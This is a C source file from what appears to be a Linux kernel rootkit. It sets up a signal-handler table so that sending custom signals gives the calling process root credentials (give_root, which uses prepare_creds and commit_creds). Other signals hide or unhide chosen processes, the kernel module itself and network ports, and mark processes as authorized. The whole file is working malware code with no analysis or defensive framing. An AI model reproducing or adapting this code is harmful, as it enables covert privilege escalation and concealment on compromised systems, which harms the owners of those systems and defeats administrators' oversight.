#include "signal_hooks.h"

#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include "net.h"
#include "utils.h"
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/gfp.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/types.h>

// Initialize signal handlers array
const signal_handler_t P_SIG_HANDLERS[] = {
    NEW_SIGNAL_HANDLER(PID_SECRET, SIGROOT, give_root),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGHIDE, show_hide_process),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGSHOW, show_hide_process),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGAUTH, authorize_process),
    NEW_SIGNAL_HANDLER(PID_SECRET, SIGMODHIDE, show_hide_module),
    NEW_SIGNAL_HANDLER(PID_SECRET, SIGMODSHOW, show_hide_module),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGPORTHIDE, show_hide_port),
    NEW_SIGNAL_HANDLER(PID_ANY, SIGPORTSHOW, show_hide_port),
    NEW_SIGNAL_HANDLER(0, 0, NULL), // The last element must have a NULL `sig_handler`
};

long show_hide_module(const pid_t i32_pid, const int i32_sig)
{
    switch (i32_sig) {
    case SIGMODHIDE:
        hide_module();
        break;

    case SIGMODSHOW:
        unhide_module();
        break;

    default:
        pr_dev_err("* show_hide_module(): Invalid signal: %d\n", i32_sig);
        return -EINVAL;
    }

    return 0;
}

long give_root(const pid_t i32_pid, const int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_dev_err("* Failed to get credentials\n");
        return -EPERM;
    }

    __SET_UIDS(p_creds, ROOT_UID);
    __SET_GIDS(p_creds, ROOT_GID);

    commit_creds(p_creds);

    pr_dev_info("* Process is now root\n");

    return 0;
}

long show_hide_process(const pid_t i32_pid, const int i32_sig)
{
    pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
    pid_list_t *p_tmp        = NULL;                       // Temporary pointer for iteration
    const pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to show

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    switch (i32_sig) {
    case SIGHIDE:
        pr_dev_info("* Hiding process %d\n", i32_real_pid);

        p_hidden_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
        IF_U (p_hidden_pid == NULL) {
            pr_dev_err("  * Failed to allocate memory for PID list entry\n");
            return -EPERM;
        }

        // Add the given PID to the list (if it is 0, add the current PID)
        p_hidden_pid->i32_pid = i32_real_pid;

        list_add(&p_hidden_pid->list, &hidden_pids_list);
        break;

    case SIGSHOW:
        pr_dev_info("* Unhiding process %d\n", i32_real_pid);

        // Remove the given PID from the hidden list (if it is 0, remove the current PID)
        list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
            if (p_hidden_pid->i32_pid == i32_real_pid) {
                list_del(&p_hidden_pid->list);
                kfree(p_hidden_pid);
            }
        }
        break;

    default:
        pr_dev_err("* show_hide_process(): Invalid signal: %d\n", i32_sig);
        return -EINVAL;
    }

    return 0;
}

long authorize_process(const pid_t i32_pid, const int i32_sig)
{
    pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
    const pid_t i32_real_pid     = get_effective_pid(i32_pid); // Effective PID to authorize

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    pr_dev_info("* Authorizing process %d\n", i32_real_pid);

    p_authorized_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
    IF_U (p_authorized_pid == NULL) {
        pr_dev_err("  * Failed to allocate memory for PID list entry\n");
        return -EPERM;
    }

    // Add the given PID to the list (if it is 0, add the current PID)
    p_authorized_pid->i32_pid = i32_real_pid;

    list_add(&p_authorized_pid->list, &authorized_pids_list);

    return 0;
}

long show_hide_port(const pid_t i32_pid, const int i32_sig)
{
    switch (i32_sig) {
    case SIGPORTHIDE:
        return add_hidden_port(i32_pid);

    case SIGPORTSHOW:
        return del_hidden_port(i32_pid);

    default:
        pr_dev_err("* show_hide_port(): Invalid signal: %d\n", i32_sig);
        return -EINVAL;
    }

    return 0;
}
